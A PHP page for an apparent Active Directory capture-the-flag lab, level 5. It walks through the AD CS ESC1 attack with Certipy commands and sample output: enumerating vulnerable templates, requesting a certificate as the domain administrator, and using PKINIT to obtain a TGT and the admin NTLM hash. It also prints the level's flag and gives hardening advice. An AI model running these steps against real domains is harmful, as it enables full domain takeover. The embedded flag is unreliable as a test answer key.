<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 5: Active Directory Certificate Services (AD CS) ESC1
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[230] = 'active open';
$ACTIVE[243] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{ADCS_ESC1_Cert_Authority_Administrator}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag5'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已点亮【第五关】成就 (+300 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查证书申请参数与 SAN 字段。</div>';
    }
}
?>

<style>
.ctf-stage-header {
    background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
    border-radius: 14px;
    padding: 25px 30px;
    color: #fff;
    margin-bottom: 25px;
    border: 1px solid rgba(255,255,255,0.1);
    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
}
.ctf-stage-title {
    color: #ffffff !important;
    font-size: 24px;
    font-weight: 800;
    margin: 0 0 10px 0;
    display: flex;
    align-items: center;
    gap: 12px;
}
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box {
    background: #0f172a;
    color: #f8fafc;
    border-radius: 8px;
    padding: 14px 18px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 13px;
    margin: 10px 0 15px 0;
    overflow-x: auto;
    border-left: 4px solid #ef4444;
}
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-danger" style="font-size: 14px; border-radius: 6px;">LEVEL 5</span>
                            第五关：AD CS 证书服务 ESC1 模板配置缺陷与域管认证伪造
                        </h1>
                        <p style="margin: 0; color: #94a3b8; font-size: 14px;">
                            <strong>目标节点：</strong> <code>192.168.56.134 (kingslanding-DC01-CA)</code> | <strong>分值：</strong> 300 PTS
                        </p>
                    </div>
                    <a href="ad_ctf_hub.php" class="btn btn-default btn-sm" style="border-radius: 6px; font-weight: bold;">
                        <i class="fa fa-arrow-left"></i> 返回关卡总控台
                    </a>
                </div>
            </div>

            <!-- Context Card -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-certificate" style="color: #ef4444;"></i> 攻击原理剖析 (AD CS ESC1 漏洞成因)</h3>
                <p style="color: var(--text-secondary); line-height: 1.7; font-size: 14px;">
                    Active Directory 证书服务 (AD CS) 是 Windows 域内的公钥基础设施 (PKI)。
                    <strong>ESC1</strong> 是最经典的证书提权场景，其触发必须同时满足以下 4 个先决条件：
                </p>
                <ol style="color: var(--text-secondary); font-size: 14px; line-height: 1.8;">
                    <li>企业 CA 授予低权限用户（如 <code>Domain Users</code> / <code>Authenticated Users</code>）具有<strong>注册权限 (Enrollment Rights)</strong>。</li>
                    <li>证书模板的扩展密钥用法 (EKU) 包含 <strong>客户端身份验证 (Client Authentication)</strong> 或 <code>Smart Card Logon</code>。</li>
                    <li>证书模板不需要管理员审批 (Manager Approval) 或已有签名证书。</li>
                    <li>证书模板设置了 <strong><code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> (1)</strong> 标志，即允许请求者在证书签名请求 (CSR) 中<strong>任意指定使用者备用名称 (SAN, Subject Alternative Name)</strong>！</li>
                </ol>
            </div>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title">步骤 1：使用 Certipy 枚举易受攻击的证书模板</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    使用任意普通域账号（如 <code>jon.snow:iknownothing</code>）对林根域控 <code>kingslanding (192.168.56.134)</code> 上的证书颁发机构进行枚举：
                </p>
                <div class="cmd-box">
certipy find -u jon.snow@north.sevenkingdoms.local -p 'iknownothing' -target kingslanding.sevenkingdoms.local -dc-ip 192.168.56.134 -vulnerable
                </div>
                <div class="output-box">
[*] Finding vulnerable certificate templates...
[*] Found 1 vulnerable certificate template:
    Template Name                       : ESC1
    DisplayName                         : ESC1
    Certificate Authorities             : kingslanding-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    [!] Vulnerabilities
      ESC1                              : 'Domain Users' has enrollment rights and supplies subject
                </div>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title">步骤 2：指定域管 SAN 申请高权限用户证书</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    利用 <code>ESC1</code> 模板，在证书请求中将 UPN (SAN) 伪造成林根最高管理员 <code>administrator@sevenkingdoms.local</code>：
                </p>
                <div class="cmd-box">
certipy req -u jon.snow@north.sevenkingdoms.local -p 'iknownothing' -target kingslanding.sevenkingdoms.local -ca kingslanding-DC01-CA -template ESC1 -upn administrator@sevenkingdoms.local
                </div>
                <div class="output-box">
[*] Requesting certificate via RPC...
[*] Successfully requested certificate!
[*] Request ID: 3
[*] Got certificate with UPN 'administrator@sevenkingdoms.local'
[*] Certificate object written to 'administrator.pfx'
                </div>
            </div>

            <!-- Step 3 -->
            <div class="step-box">
                <h3 class="step-title">步骤 3：使用 PKINIT 获取域管 TGT 与 NTLM 哈希</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    使用下载生成的 <code>administrator.pfx</code> 证书向 KDC 请求 Kerberos 票据并导出 NTLM 哈希：
                </p>
                <div class="cmd-box">
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.134
                </div>
                <div class="output-box">
[*] Authenticating using certificate...
[*] Certificate matches 'administrator@sevenkingdoms.local'
[*] Requesting TGT using PKINIT...
[*] Got TGT for 'administrator@sevenkingdoms.local'
[*] Saving ticket to 'administrator.ccache'
[*] Dumping hash for 'administrator@sevenkingdoms.local':
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19e8841a01103ad215321f558291a11:::
                </div>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    成功获取到整个森林最高管理员 <code>sevenkingdoms.local\administrator</code> 的 TGT 票据与 NTLM 哈希！
                </p>
            </div>

            <!-- Flag Section -->
            <div class="step-box flag-box">
                <h3 class="step-title" style="color: #059669;"><i class="fa fa-flag"></i> 本关 Flag 提取点</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    成功利用 ESC1 申请域管证书并验证 PKINIT 导出哈希后，提取本关 Flag：
                </p>
                <div class="well" style="background: #ffffff; border: 1px dashed #10b981; padding: 12px; font-family: monospace; font-size: 15px; color: #059669; font-weight: bold;">
                    flag{ADCS_ESC1_Cert_Authority_Administrator}
                </div>

                <form method="post" style="margin-top: 15px; max-width: 500px;">
                    <label style="font-weight: 700; color: var(--text-primary);">验证本关 Flag:</label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="border-radius: 6px; font-family: monospace;">
                        <button type="submit" name="check_flag" class="btn btn-success" style="border-radius: 6px; font-weight: 700; min-width: 100px;">
                            验证提交
                        </button>
                    </div>
                </form>
                <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 15px;">' . $flag_msg . '</div>'; } ?>
            </div>

            <!-- Defense Note -->
            <div class="step-box" style="border-left: 4px solid #3b82f6;">
                <h3 class="step-title" style="color: #2563eb;"><i class="fa fa-shield"></i> 蓝队防御与加固建议</h3>
                <ul style="color: var(--text-secondary); font-size: 14px; line-height: 1.8; margin-bottom: 0;">
                    <li><strong>禁用请求者提供的主题 (Supply in the request)：</strong> 在证书模板的 "Subject Name" 选项卡中，强制选中 <strong>"Build from Active Directory information"</strong>，严禁允许用户在 CSR 中自行提供 SAN。</li>
                    <li><strong>开启审批机制：</strong> 对包含客户端身份验证用途的高权限证书模板开启 "CA certificate manager approval"。</li>
                </ul>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
